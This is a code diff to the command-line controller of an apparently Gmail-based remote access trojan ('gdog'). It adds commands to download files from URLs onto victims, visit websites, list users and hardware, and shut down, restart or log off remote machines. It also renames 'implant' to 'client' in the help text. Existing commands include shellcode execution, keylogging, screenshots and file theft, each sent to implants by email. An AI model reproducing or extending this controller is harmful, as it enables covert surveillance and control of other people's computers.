@@ -273,16 +273,24 @@ if __name__ == '__main__':
     blogopts.add_argument("-list", dest="list", action="store_true", help="List available clients")
     blogopts.add_argument("-info", dest='info', action='store_true', help='Retrieve info on specified client')
 
-    sgroup = parser.add_argument_group("Commands", "Commands to execute on an implant")
+    sgroup = parser.add_argument_group("Commands", "Commands to execute on a client")
     slogopts = sgroup.add_mutually_exclusive_group()
     slogopts.add_argument("-cmd", metavar='CMD', dest='cmd', type=str, help='Execute a system command')
+    slogopts.add_argument("-visitwebsite", metavar='URL', dest='visitwebsite', type=str, help='Visit website')
+    slogopts.add_argument("-message", metavar=('TEXT', 'TITLE'), nargs=2, type=str, help='Show message to user')
     slogopts.add_argument("-tasks", dest='tasks', action='store_true', help='Retrieve running processes')
     slogopts.add_argument("-services", dest='services', action='store_true', help='Retrieve system services')
+    slogopts.add_argument("-users", dest='users', action='store_true', help='Retrieve system users')
+    slogopts.add_argument("-devices", dest='devices', action='store_true', help='Retrieve devices(Hardware)')
     slogopts.add_argument("-download", metavar='PATH', dest='download', type=str, help='Download a file from a clients system')
+    slogopts.add_argument("-download-fromurl", metavar='URL', dest='fromurl', type=str, help='Download a file from the web')
     slogopts.add_argument("-upload", nargs=2, metavar=('SRC', 'DST'), help="Upload a file to the clients system")
     slogopts.add_argument("-exec-shellcode", metavar='FILE',type=argparse.FileType('rb'), dest='shellcode', help='Execute supplied shellcode on a client')
     slogopts.add_argument("-screenshot", dest='screen', action='store_true', help='Take a screenshot')
     slogopts.add_argument("-lock-screen", dest='lockscreen', action='store_true', help='Lock the clients screen')
+    slogopts.add_argument("-shutdown", dest='shutdown', action='store_true', help='Shutdown remote computer')
+    slogopts.add_argument("-restart", dest='restart', action='store_true', help='Restart remote computer')
+    slogopts.add_argument("-logoff", dest='logoff', action='store_true', help='Log off current remote user')
     slogopts.add_argument("-force-checkin", dest='forcecheckin', action='store_true', help='Force a check in')
     slogopts.add_argument("-start-keylogger", dest='keylogger', action='store_true', help='Start keylogger')
     slogopts.add_argument("-stop-keylogger", dest='stopkeylogger', action='store_true', help='Stop keylogger')
@@ -305,11 +313,23 @@ if __name__ == '__main__':
     elif args.cmd:
         gdog.sendEmail(args.id, jobid, 'cmd', args.cmd)
 
+    elif args.visitwebsite:
+        gdog.sendEmail(args.id, jobid, 'visitwebsite', args.visitwebsite)
+        
+    elif args.message:
+        gdog.sendEmail(args.id, jobid, 'message', args.message)
+        
     elif args.tasks:
         gdog.sendEmail(args.id, jobid, 'tasks')
     
     elif args.services:
         gdog.sendEmail(args.id, jobid, 'services')
+        
+    elif args.users:
+        gdog.sendEmail(args.id, jobid, 'users')
+        
+    elif args.devices:
+        gdog.sendEmail(args.id, jobid, 'devices')
         
     elif args.shellcode:
         gdog.sendEmail(args.id, jobid, 'execshellcode', args.shellcode.read().strip())
@@ -317,6 +337,9 @@ if __name__ == '__main__':
     elif args.download:
         gdog.sendEmail(args.id, jobid, 'download', r'{}'.format(args.download))
 
+    elif args.fromurl:
+        gdog.sendEmail(args.id, jobid, 'downloadfromurl', r'{}'.format(args.fromurl))
+        
     elif args.upload:
         gdog.sendEmail(args.id, jobid, 'upload', r'{}'.format(args.upload[1]), [args.upload[0]])
 
@@ -326,6 +349,15 @@ if __name__ == '__main__':
     elif args.lockscreen:
         gdog.sendEmail(args.id, jobid, 'lockscreen')
 
+    elif args.shutdown:
+        gdog.sendEmail(args.id, jobid, 'shutdown')
+        
+    elif args.restart:
+        gdog.sendEmail(args.id, jobid, 'restart')
+        
+    elif args.logoff:
+        gdog.sendEmail(args.id, jobid, 'logoff')
+        
     elif args.forcecheckin:
         gdog.sendEmail(args.id, jobid, 'forcecheckin')
 
